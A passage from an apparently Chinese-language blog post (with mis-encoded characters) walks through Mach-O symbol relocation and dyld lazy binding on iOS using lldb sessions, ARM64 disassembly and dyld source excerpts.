alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%209.png"></p><p>ä»¥fooç¬¦å·ä¸ºä¾‹ : </p><p>Type ä» N_UNDF â†’ NSECT</p><p>Value ä»0 â†’ 0x100007f90 </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.17.57@2x.png" alt="CleanShot 2021-07-20 at 15.17.57@2x"></p><p>ç¬¦å·è¡¨ç»“æ„:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct nlist_64 &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        uint32_t n_strx;   /* index into the string table */</span><br><span class="line">    &#125; n_un;</span><br><span class="line">    uint8_t  n_type;       /* <span class="built_in">type</span> flag, see below */</span><br><span class="line">    uint8_t  n_sect;       /* section number or NO_SECT */</span><br><span class="line">    uint16_t n_desc;       /* see &lt;mach-o/stab.h&gt; */</span><br><span class="line">    uint64_t n_value;      /* value of this symbol (or stab offset) */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>foo ç¬¦å·çš„è¯</p><ul><li>string table index : æŒ‡å‘ç¬¦å·çš„å­—ç¬¦ä¸²</li><li>n_sect : æ”¹ç¬¦å·åœ¨ç¬¬å‡ ä¸ªsection</li><li>n_value : ç¬¦å·å…·ä½“å€¼(åœ°å€)</li></ul><h2 id="ä¸¾ä¸ªğŸŒ°"><a href="#ä¸¾ä¸ªğŸŒ°" class="headerlink" title="ä¸¾ä¸ªğŸŒ°"></a>ä¸¾ä¸ªğŸŒ°</h2><p>è¿™é‡Œä»¥demoä¸­ global_var ä½¿ç”¨çš„ä»£ç ä¸¾ä¾‹å­ã€‚</p><p>æºç ä¸­:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ret = foo(42 + global_var);</span><br></pre></td></tr></table></figure><p>å¦‚æœå¯¹åº”åˆ°æ±‡ç¼–é‡Œåº”è¯¥æ˜¯:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0000000000000014         adrp       x9, <span class="comment">#0x0                                    ; 0x68@PAGE</span></span><br><span class="line">0000000000000018         ldr        x9, [x9, <span class="comment">#0x68]                             ; 0x68@PAGEOFF</span></span><br><span class="line">000000000000001c         ldr        w10, [x9]</span><br><span class="line">0000000000000020         add        w0, w10, <span class="comment">#0x2a</span></span><br><span class="line">0000000000000024         str        w8, [sp, <span class="comment">#0x10 + var_C]</span></span><br><span class="line">0000000000000028         bl         _foo</span><br></pre></td></tr></table></figure><p>å¯çŸ¥ w0 æ˜¯å‚æ•°ï¼Œw10æ˜¯global_varçš„å€¼ï¼Œæ¥è‡ªx9</p><p><code>w10  = [x9 + 0x68]</code> (æœªé‡å®šä½ä¿®å¤ï¼‰</p><p>æœ€å¼€å§‹ç´¢å¼•x9çš„æ—¶å€™å¯ä»¥å‘ç°æ˜¯æŠŠ0èµ‹ç»™äº†x9ï¼Œå› ä¸ºè¿™é‡Œè¿˜æ²¡æœ‰é‡å®šä½ï¼Œæ‰€ä»¥ç”¨0ä»£æ›¿ã€‚</p><p>æœ€ç»ˆçš„äº§ç‰©ä¸­å¯ä»¥çœ‹åˆ°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0000000100007f64         adrp       x9, <span class="comment">#0x100008000                            ; 0x100008000@PAGE</span></span><br><span class="line">0000000100007f68         add        x9, x9, <span class="comment">#0x0                                ; 0x100008000@PAGEOFF, _global_var</span></span><br><span class="line">0000000100007f6c         ldr        w10, [x9]                                   ; _global_var</span><br><span class="line">0000000100007f70         add        w0, w10, <span class="comment">#0x2a</span></span><br><span class="line">0000000100007f74         str        w8, [sp, <span class="comment">#0x10 + var_C]</span></span><br><span class="line">0000000100007f78         bl         _foo</span><br></pre></td></tr></table></figure><p>æŠŠ0æ›¿æ¢æˆäº† 0x100008000ï¼Œè¿™ä¸ªåœ°å€æ°å¥½æŒ‡å‘global_varã€‚</p><p>å¯ä»¥çœ‹åˆ°ç»è¿‡linkerçš„å¤„ç†ï¼Œå¯ä»¥æ­£ç¡®æ‰¾åˆ°global_varï¼Œç¬¦å·fooåŒç†</p><h1 id="åŠ¨æ€é“¾æ¥"><a href="#åŠ¨æ€é“¾æ¥" class="headerlink" title="åŠ¨æ€é“¾æ¥"></a>åŠ¨æ€é“¾æ¥</h1><h2 id="debug-set-up"><a href="#debug-set-up" class="headerlink" title="debug set up"></a>debug set up</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.18.24@2x.png" alt="CleanShot 2021-07-20 at 15.18.24@2x"></p><p>åº”è¯¥æ˜¯ç­¾åæœ‰é—®é¢˜ï¼Œæœ€ç»ˆè§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/security find-identity -v -p codesigning</span><br><span class="line"># get : A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455</span><br><span class="line"></span><br><span class="line">codesign -s "A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455" --entitlements entitlements.xml -f libFoo.dylib</span><br><span class="line">codesign -s "A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455" --entitlements entitlements.xml -f main</span><br><span class="line"></span><br><span class="line"># scp ....</span><br><span class="line"># ssh ....</span><br><span class="line">mude-iPhone:/tmp root# ./main</span><br><span class="line">magic is : 4919</span><br><span class="line">4920</span><br></pre></td></tr></table></figure><h2 id="debug-lazy-binding-process"><a href="#debug-lazy-binding-process" class="headerlink" title="debug lazy binding process"></a>debug lazy binding process</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.19.30@2x.png" alt="CleanShot 2021-07-20 at 15.19.30@2x"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨ <code>printf</code>çš„æ—¶å€™ï¼Œblè·³è¿‡å»å¹¶ä¸æ˜¯ printfå‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) s</span><br><span class="line">Process 1453 stopped</span><br><span class="line">* thread #1, queue &#x3D; &#39;com.apple.main-thread&#39;, stop reason &#x3D; instruction step into</span><br><span class="line">    frame #0: 0x000000010089bf7c main</span><br><span class="line">-&gt;  0x10089bf7c: br     x16</span><br><span class="line">    0x10089bf80: ldr    w16, 0x10089bf88</span><br><span class="line">    0x10089bf84: b      0x10089bf68</span><br><span class="line">    0x10089bf88: udf    #0x0</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x16</span><br><span class="line">     x16 &#x3D; 0x00000001d858080c  libdyld.dylib&#96;dyld_stub_binder</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 &#x3D; 0x000000010089bfa4  &quot;magic is : %d\n&quot;</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 &#x3D; 0x0000000000001337</span><br></pre></td></tr></table></figure><p>é€šè¿‡ <code>dyld_stub_binder</code> æ‰¾ <code>printf</code>çš„åœ°å€ï¼ŒæŠŠæ‰¾åˆ°çš„åœ°å€å†™å›åˆ° <code>DATA,__la_symbol_ptr</code></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.20.15@2x.png" alt="CleanShot 2021-07-20 at 15.20.15@2x"></p><p>ç¬¬äºŒæ¬¡è°ƒç”¨printfçš„æ—¶å€™å°±å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªåœ°æ–¹printfå‡½æ•°åœ°å€å·²ç»è¢«å†™è¿‡æ¥äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(lldb) x/10i <span class="variable">$pc</span></span><br><span class="line">-&gt;  0x100dcff60: 0x58000610   ldr    x16, <span class="comment">#0xc0                ; (void *)0x00000001d860e14c: printf</span></span><br><span class="line">    0x100dcff64: 0xd61f0200   br     x16</span><br><span class="line">    0x100dcff68: 0x10000611   adr    x17, <span class="comment">#0xc0                ; _dyld_private</span></span><br><span class="line">    0x100dcff6c: 0xd503201f   nop</span><br><span class="line">    0x100dcff70: 0xa9bf47f0   stp    x16, x17, [sp, <span class="comment">#-0x10]!</span></span><br><span class="line">    0x100dcff74: 0xd503201f   nop</span><br><span class="line">    0x100dcff78: 0x58000490   ldr    x16, <span class="comment">#0x90                ; (void *)0x00000001d858080c: dyld_stub_binder</span></span><br><span class="line">    0x100dcff7c: 0xd61f0200   br     x16</span><br><span class="line">    0x100dcff80: 0x18000050   ldr    w16, 0x100dcff88</span><br><span class="line">    0x100dcff84: 0x17fffff9   b      0x100dcff68</span><br><span class="line">(lldb) x/3i <span class="variable">$pc</span></span><br><span class="line">-&gt;  0x100dcff60: 0x58000610   ldr    x16, <span class="comment">#0xc0                ; (void *)0x00000001d860e14c: printf</span></span><br><span class="line">    0x100dcff64: 0xd61f0200   br     x16</span><br><span class="line">    0x100dcff68: 0x10000611   adr    x17, <span class="comment">#0xc0                ; _dyld_private</span></span><br><span class="line">(lldb) x/gx <span class="variable">$pc</span>+0xc0</span><br><span class="line">0x100dd0020: 0x00000001d860e14c</span><br><span class="line">(lldb) memory region 0x00000001d860e14c</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œå°±å¯ä»¥ç›´æ¥è·å–åˆ°åœ°å€ï¼Œç„¶åç›´æ¥è·³è½¬è¿‡å»å°±è¡Œ:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) s</span><br><span class="line">Process 1453 stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into</span><br><span class="line">    frame #0: 0x000000010089bf60 main`printf + 4</span><br><span class="line">main`printf:</span><br><span class="line">-&gt;  0x10089bf60 <span class="tag">&lt;<span class="name">+4</span>&gt;</span>: ldr    x16, #0xc0                ; (void *)0x00000001d860e14c: printf</span><br><span class="line">    0x10089bf64 <span class="tag">&lt;<span class="name">+8</span>&gt;</span>: br     x16</span><br><span class="line">    0x10089bf68:      adr    x17, #0xc0                ; _dyld_private</span><br><span class="line">    0x10089bf6c:      nop</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) s</span><br><span class="line">Process 1453 stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into</span><br><span class="line">    frame #0: 0x000000010089bf64 main`printf + 8</span><br><span class="line">main`printf:</span><br><span class="line">-&gt;  0x10089bf64 <span class="tag">&lt;<span class="name">+8</span>&gt;</span>: br     x16</span><br><span class="line">    0x10089bf68:      adr    x17, #0xc0                ; _dyld_private</span><br><span class="line">    0x10089bf6c:      nop</span><br><span class="line">    0x10089bf70:      stp    x16, x17, [sp, #-0x10]!</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x16</span><br><span class="line">     x16 = 0x00000001d860e14c  libsystem_c.dylib`printf</span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><h2 id="libdyld-dylib-dyld-stub-binder"><a href="#libdyld-dylib-dyld-stub-binder" class="headerlink" title="libdyld.dylib`dyld_stub_binder"></a>libdyld.dylib`dyld_stub_binder</h2><p>dyld-852çš„ä»£ç ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.20.35@2x.png" alt="CleanShot 2021-07-20 at 15.20.35@2x"></p><p>å› ä¸ºæˆ‘ç›®æ ‡ç¯å¢ƒæ˜¯iOS12.2ï¼Œæ‰€ä»¥å…·ä½“æ±‡ç¼–ä»£ç æœ‰ä¸€äº›å·®åˆ«ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) x&#x2F;30i $pc</span><br><span class="line">-&gt;  0x1d858080c: 0xa9bf7bfd   stp    x29, x30, [sp, #-0x10]!</span><br><span class="line">    0x1d8580810: 0x910003fd   mov    x29, sp</span><br><span class="line">    0x1d8580814: 0xd103c3ff   sub    sp, sp, #0xf0             ; &#x3D;0xf0</span><br><span class="line">    0x1d8580818: 0xa93f07a0   stp    x0, x1, [x29, #-0x10]</span><br><span class="line">    0x1d858081c: 0xa93e0fa2   stp    x2, x3, [x29, #-0x20]</span><br><span class="line">    0x1d8580820: 0xa93d17a4   stp    x4, x5, [x29, #-0x30]</span><br><span class="line">    0x1d8580824: 0xa93c1fa6   stp    x6, x7, [x29, #-0x40]</span><br><span class="line">    0x1d8580828: 0xa93b27a8   stp    x8, x9, [x29, #-0x50]</span><br><span class="line">    0x1d858082c: 0xad3c07a0   stp    q0, q1, [x29, #-0x80]</span><br><span class="line">    0x1d8580830: 0xad3b0fa2   stp    q2, q3, [x29, #-0xa0]</span><br><span class="line">    0x1d8580834: 0xad3a17a4   stp    q4, q5, [x29, #-0xc0]</span><br><span class="line">    0x1d8580838: 0xad391fa6   stp    q6, q7, [x29, #-0xe0]</span><br><span class="line">    0x1d858083c: 0xf9400fa0   ldr    x0, [x29, #0x18]</span><br><span class="line">    0x1d8580840: 0xf9400ba1   ldr    x1, [x29, #0x10]</span><br><span class="line">    0x1d8580844: 0x940004e4   bl     0x1d8581bd4               ; _dyld_fast_stub_entry(void*, long)</span><br><span class="line">    0x1d8580848: 0xaa0003f0   mov    x16, x0</span><br><span class="line">    0x1d858084c: 0xa97f07a0   ldp    x0, x1, [x29, #-0x10]</span><br><span class="line">    0x1d8580850: 0xa97e0fa2   ldp    x2, x3, [x29, #-0x20]</span><br><span class="line">    0x1d8580854: 0xa97d17a4   ldp    x4, x5, [x29, #-0x30]</span><br><span class="line">    0x1d8580858: 0xa97c1fa6   ldp    x6, x7, [x29, #-0x40]</span><br><span class="line">    0x1d858085c: 0xa97b27a8   ldp    x8, x9, [x29, #-0x50]</span><br><span class="line">    0x1d8580860: 0xad7c07a0   ldp    q0, q1, [x29, #-0x80]</span><br><span class="line">    0x1d8580864: 0xad7b0fa2   ldp    q2, q3, [x29, #-0xa0]</span><br><span class="line">    0x1d8580868: 0xad7a17a4   ldp    q4, q5, [x29, #-0xc0]</span><br><span class="line">    0x1d858086c: 0xad791fa6   ldp    q6, q7, [x29, #-0xe0]</span><br><span class="line">    0x1d8580870: 0x910003bf   mov    sp, x29</span><br><span class="line">    0x1d8580874: 0xa8c17bfd   ldp    x29, x30, [sp], #0x10</span><br><span class="line">    0x1d8580878: 0x910043ff   add    sp, sp, #0x10             ; &#x3D;0x10</span><br><span class="line">    0x1d858087c: 0xd61f0200   br     x16</span><br><span class="line">    0x1d8580880: 0xd10103ff   sub    sp, sp, #0x40             ; &#x3D;0x40</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æœ¬è´¨ä¸Šæ˜¯å·®ä¸å¤šçš„ï¼Œå½±å“ä¸å¤§ã€‚</p><p>ä¸‹é¢çœ‹çœ‹æ€ä¹ˆä¸€æ­¥ä¸€æ­¥è°ƒç”¨è¿›å»ï¼Œæ‰¾åˆ°æ‰€éœ€è¦çš„ç¬¦å·</p><h3 id="1-call-dyld-stub-binder"><a href="#1-call-dyld-stub-binder" class="headerlink" title="1.  call dyld_stub_binder"></a>1.  call dyld_stub_binder</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0000000100007f98         ldr        w16, &#x3D;0x6967616d0000001a</span><br><span class="line">0000000100007f9c         b          0x100007f68</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">0000000100007f68         adr        x17, #0x100008028                           ; CODE XREF&#x3D;0x100007f84, 0x100007f90, 0x100007f9c</span><br><span class="line">&#x2F;&#x2F; x17-&gt; _dyld_private</span><br><span class="line"></span><br><span class="line">0000000100007f6c         nop</span><br><span class="line">0000000100007f70         stp        x16, x17, [sp, #-0x10]!</span><br><span class="line"></span><br><span class="line">0000000100007f74         nop</span><br><span class="line">0000000100007f78         ldr        x16, #dyld_stub_binder_100008008</span><br><span class="line"></span><br><span class="line">0000000100007f7c         br         x16 &#x2F;&#x2F; call dyld_stub_binder</span><br></pre></td></tr></table></figure><p>ä¸ªäººçŒœæµ‹ï¼š<code>0x000000000000001a</code> åº”è¯¥æ˜¯ ç±»ä¼¼ linuxä¸‹elf lazy bindingçš„æ—¶å€™é‚£ä¸ªindexå‚æ•°çš„ä¸œè¥¿ï¼Œæ¯ä¸ªç¬¦å·éƒ½ä¸ä¸€æ · ã€‚</p><p>åˆå§‹åŒ–å¥½éœ€è¦çš„å‚æ•°å°±è°ƒç”¨è¿›å»dyldä¸­å»åšç¬¦å·ç»‘å®šæ“ä½œäº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) s</span><br><span class="line">Process 1465 stopped</span><br><span class="line">* thread <span class="comment">#1, queue = 'com.apple.main-thread', stop reason = instruction step into</span></span><br><span class="line">    frame <span class="comment">#0: 0x0000000100fb7f7c main</span></span><br><span class="line">-&gt;  0x100fb7f7c: br     x16</span><br><span class="line">    0x100fb7f80: ldr    w16, 0x100fb7f88</span><br><span class="line">    0x100fb7f84: b      0x100fb7f68</span><br><span class="line">    0x100fb7f88: udf    <span class="comment">#0x0</span></span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x16</span><br><span class="line">     x16 = 0x00000001d858080c  libdyld.dylib`dyld_stub_binder</span><br><span class="line">(lldb) x/10gx <span class="variable">$sp</span></span><br><span class="line">0x16ee4f5a0: 0x000000000000001a 0x0000000100fb8028</span><br><span class="line">0x16ee4f5b0: 0x0000000000001337 0x0000000000000000</span><br><span class="line">0x16ee4f5c0: 0x0000000000000000 0x0000000000000001</span><br><span class="line">0x16ee4f5d0: 0x000000016ee4f5f0 0x00000001d857e8e0</span><br><span class="line">0x16ee4f5e0: 0x00000001d857e8e0 0x0000000000000000</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = 0x0000000100fb7fa4  <span class="string">"magic is : %d\n"</span></span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = 0x0000000000001337</span><br><span class="line">(lldb) re re x2</span><br><span class="line">      x2 = 0x00000000000120a8</span><br></pre></td></tr></table></figure><h3 id="2-call-dyld-fastBindLazySymbol-loadercache-lazyinfo"><a href="#2-call-dyld-fastBindLazySymbol-loadercache-lazyinfo" class="headerlink" title="2. call dyld::fastBindLazySymbol(loadercache, lazyinfo)"></a>2. call dyld::fastBindLazySymbol(loadercache, lazyinfo)</h3><p>ä¿å­˜æ ˆå¸§ï¼Œä¿å­˜å½“å‰çš„å¯„å­˜å™¨ä¿¡æ¯(ä¸€å¤§å †stpæŒ‡ä»¤ï¼Œåé¢ç¬¦å·ç»‘å®šå®Œæˆåï¼Œldpä¼šæ¢å¤ï¼Œè¿™äº›æ˜¯æˆå¯¹çš„)ï¼Œç„¶åè®¾ç½®å¥½å‚æ•°ï¼Œå°±ç›´æ¥è½¬åˆ° <code>dyld::fastBindLazySymbol</code></p><p>ï¼ˆå‡½æ•°å‰é¢çš„ä¿å­˜æ“ä½œçœ‹èµ·æ¥å’Œx86ä¸Šå‡½æ•°å¼€å¤´çš„ä¿å­˜æ ˆå¸§ æŠ¬é«˜æ ˆçµ¦ä¸´æ—¶å˜é‡é¢„ç•™ç©ºé—´çš„æ“ä½œå·®ä¸å¤šï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Process 1465 resuming</span><br><span class="line">Process 1465 stopped</span><br><span class="line">* thread <span class="comment">#1, queue = 'com.apple.main-thread', stop reason = breakpoint 3.1</span></span><br><span class="line">    frame <span class="comment">#0: 0x00000001d8580844 libdyld.dylib`dyld_stub_binder + 56</span></span><br><span class="line">libdyld.dylib`dyld_stub_binder:</span><br><span class="line">-&gt;  0x1d8580844 &lt;+56&gt;: bl     0x1d8581bd4               ; _dyld_fast_stub_entry(void*, long)</span><br><span class="line">    0x1d8580848 &lt;+60&gt;: mov    x16, x0</span><br><span class="line">    0x1d858084c &lt;+64&gt;: ldp    x0, x1, [x29, <span class="comment">#-0x10]</span></span><br><span class="line">    0x1d8580850 &lt;+68&gt;: ldp    x2, x3, [x29, <span class="comment">#-0x20]</span></span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = 0x0000000100fb8028  _dyld_private</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = 0x000000000000001a</span><br></pre></td></tr></table></figure><p>è°ƒç”¨çš„æ˜¯ : <code>fastBindLazySymbol(0x0000000100fb8028, 0x1a)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  LINK_EDIT seg</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* <span class="keyword">const</span> start = fLinkEditBase + fDyldInfo-&gt;lazy_bind_off;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* <span class="keyword">const</span> <span class="built_in">end</span> = &amp;start[fDyldInfo-&gt;lazy_bind_size];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ....</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( ! getLazyBindingInfo(lazyBindingInfoOffset, start, <span class="built_in">end</span>, &amp;segIndex, &amp;segOffset, &amp;libraryOrdinal, &amp;symbolName, &amp;doneAfterBind) )</span><br><span class="line">            dyld::throwf(<span class="string">"bad lazy bind info"</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">while</span> (!doneAfterBind &amp;&amp; !context.strictMachORequired);</span><br></pre></td></tr></table></figure><p>å¯¹åº”æ±‡ç¼–ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(lldb) c</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> resuming</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 4.1</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100fe5e6c</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">136</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5e6c</span> &lt;+<span class="number">136</span>&gt;: bl     <span class="number">0x100fe1d98</span>               ; ImageLoaderMachO::getLazyBindingInfo(<span class="keyword">unsigned</span> <span class="keyword">int</span>&amp;, <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">unsigned</span> <span class="keyword">char</span>*, <span class="keyword">unsigned</span> <span class="keyword">long</span>*, <span class="keyword">int</span>*, <span class="keyword">char</span> <span class="keyword">const</span>**, <span class="keyword">bool</span>*)</span><br><span class="line">    <span class="number">0x100fe5e70</span> &lt;+<span class="number">140</span>&gt;: tbz    w0, #<span class="number">0x0</span>, <span class="number">0x100fe5f80</span>     ; &lt;+<span class="number">412</span>&gt;</span><br><span class="line">    <span class="number">0x100fe5e74</span> &lt;+<span class="number">144</span>&gt;: ldrb   w1, [sp, #<span class="number">0x43</span>]</span><br><span class="line">    <span class="number">0x100fe5e78</span> &lt;+<span class="number">148</span>&gt;: ldrb   w8, [x20, #<span class="number">0x74</span>]</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = <span class="number">0x0000000100fbc030</span></span><br><span class="line">(lldb) re re x2</span><br><span class="line">      x2 = <span class="number">0x0000000100fbc058</span></span><br><span class="line">(lldb) memory region <span class="number">0x0000000100fbc030</span></span><br><span class="line">[<span class="number">0x0000000100fbc000</span><span class="number">-0x0000000100fc0000</span>) r-- __LINKEDIT</span><br><span class="line"></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº† æˆ‘è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„LINK_EDIT æ®µå»åšç¬¦å·ç»‘å®šå·¥ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(lldb) <span class="built_in">image</span> lookup -va $x1</span><br><span class="line">      Address: main[<span class="number">0x000000010000c030</span>] (main.__LINKEDIT + <span 